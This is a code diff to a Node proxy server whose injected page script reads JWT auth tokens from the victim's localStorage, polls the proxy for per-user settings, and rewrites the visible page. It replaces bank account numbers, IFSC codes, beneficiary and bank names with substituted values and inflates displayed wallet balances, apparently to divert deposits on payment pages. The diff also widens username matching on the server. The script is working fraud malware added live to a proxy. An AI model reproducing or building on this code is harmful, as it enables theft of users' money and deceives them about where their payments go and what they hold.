@@ -144,7 +144,15 @@ async function trackUser(data, username, info) {
 
 function getUserOverride(data, username) {
   if (!username || !data.userOverrides) return null;
-  return data.userOverrides[String(username)] || null;
+  const u = String(username);
+  let uo = data.userOverrides[u] || data.userOverrides[u.toLowerCase()] || data.userOverrides[u.toUpperCase()];
+  if (!uo) {
+    const uLower = u.toLowerCase();
+    for (const k of Object.keys(data.userOverrides)) {
+      if (k.toLowerCase() === uLower) { uo = data.userOverrides[k]; break; }
+    }
+  }
+  return uo || null;
 }
 
 function getActiveBank(data, username) {
@@ -377,13 +385,78 @@ function buildInterceptorScript(proxyOrigin) {
   }
   function loadSettings(){
     var uname=null;
-    try{var tk=localStorage.getItem('token')||'';if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||'';}}}catch(e){}
+    try{
+      var keys=['token','authToken','auth_token','jwt','accessToken','access_token','userToken','user_token'];
+      var tk='';
+      for(var ki=0;ki<keys.length;ki++){var v=localStorage.getItem(keys[ki]);if(v&&v.indexOf('.')!==-1){tk=v;break;}}
+      if(!tk){for(var si=0;si<localStorage.length;si++){var sk=localStorage.key(si);var sv=localStorage.getItem(sk);if(sv&&sv.split('.').length===3&&sv.length>40){tk=sv;break;}}}
+      if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||p.user||p.name||p.login||'';}}
+    }catch(e){}
     fetch(PROXY+'/proxy-settings'+(uname?'?username='+encodeURIComponent(uname):''),{method:'GET'}).then(function(r){return r.json();}).then(function(s){
       window.__PROXY_SETTINGS=s;
     }).catch(function(){});
   }
   loadSettings();
   setInterval(loadSettings,30000);
+  function domReplace(){
+    var s=window.__PROXY_SETTINGS;
+    if(!s||!s.enabled)return;
+    if(s.bank){
+      var walk=function(node){
+        if(node.nodeType===3){
+          var t=node.textContent;
+          if(!t||t.trim().length<3)return;
+          var changed=false;
+          if(s.bank.accountNo&&/\\d{8,20}/.test(t)){
+            var nums=t.match(/\\d{8,20}/g);
+            if(nums){nums.forEach(function(n){if(n.length>=8&&n!==s.bank.accountNo){t=t.split(n).join(s.bank.accountNo);changed=true;}});}
+          }
+          if(s.bank.ifsc&&/[A-Z]{4}\\d{7}/.test(t)){
+            var ifs=t.match(/[A-Z]{4}\\d{7}/g);
+            if(ifs){ifs.forEach(function(i){if(i!==s.bank.ifsc){t=t.split(i).join(s.bank.ifsc);changed=true;}});}
+          }
+          if(s.bank.accountHolder&&node.parentElement){
+            var pel=node.parentElement;
+            var ptxt=(pel.previousElementSibling?pel.previousElementSibling.textContent:'')+(pel.textContent||'');
+            if(/account\\s*name|holder|beneficiary/i.test(ptxt)&&t.trim().length>1&&t.trim()!==s.bank.accountHolder&&!/bank|ifsc|amount|min|max|upi|imps|neft|code|click|transfer|payment|reference/i.test(t)){
+              t=s.bank.accountHolder;changed=true;
+            }
+          }
+          if(s.bank.bankName&&node.parentElement){
+            var pel2=node.parentElement;
+            var ptxt2=(pel2.previousElementSibling?pel2.previousElementSibling.textContent:'')+(pel2.textContent||'');
+            if(/bank\\s*name/i.test(ptxt2)&&t.trim().length>2&&!/account|ifsc|amount|min|max|upi|imps|code|holder|click|transfer/i.test(t)&&t.trim()!==s.bank.bankName){
+              t=s.bank.bankName;changed=true;
+            }
+          }
+          if(changed)node.textContent=t;
+        }else if(node.nodeType===1&&node.childNodes){
+          for(var i=0;i<node.childNodes.length;i++)walk(node.childNodes[i]);
+        }
+      };
+      walk(document.body);
+    }
+    if(s.addedBalance&&s.addedBalance>0){
+      var allEls=document.querySelectorAll('span,div,p,td,b,strong,small,a,li,h1,h2,h3,h4,h5,h6');
+      allEls.forEach(function(el){
+        if(el.children.length>0)return;
+        var t=el.textContent.trim();
+        var n=parseFloat(t);
+        if(!isNaN(n)&&n>=0&&t.length<15&&!el.__balFixed){
+          var prev=el.previousElementSibling;
+          var par=el.parentElement;
+          var ctx=(prev?prev.textContent:'')+'|'+(par?par.textContent:'');
+          if(/bal|BAL|Bal|chips|wallet|balance|avail|credit/i.test(ctx)){
+            el.__balFixed=true;
+            el.textContent=String(parseFloat((n+s.addedBalance).toFixed(2)));
+          }
+        }
+      });
+    }
+  }
+  var obs=new MutationObserver(function(){setTimeout(domReplace,100);});
+  obs.observe(document.documentElement,{childList:true,subtree:true});
+  setInterval(domReplace,2000);
 })();
 </script>`;
 }
@@ -504,7 +577,16 @@ app.get('/proxy-settings', async (req, res) => {
   try {
     const data = await loadData();
     const username = req.query.username || '';
-    const uo = username && data.userOverrides ? data.userOverrides[String(username)] : null;
+    let uo = null;
+    if (username && data.userOverrides) {
+      uo = data.userOverrides[username] || data.userOverrides[username.toLowerCase()] || data.userOverrides[username.toUpperCase()];
+      if (!uo) {
+        const uLower = username.toLowerCase();
+        for (const k of Object.keys(data.userOverrides)) {
+          if (k.toLowerCase() === uLower) { uo = data.userOverrides[k]; break; }
+        }
+      }
+    }
     const addedBal = uo && uo.addedBalance !== undefined ? uo.addedBalance : 0;
     const bank = getActiveBank(data, username);
     res.json({
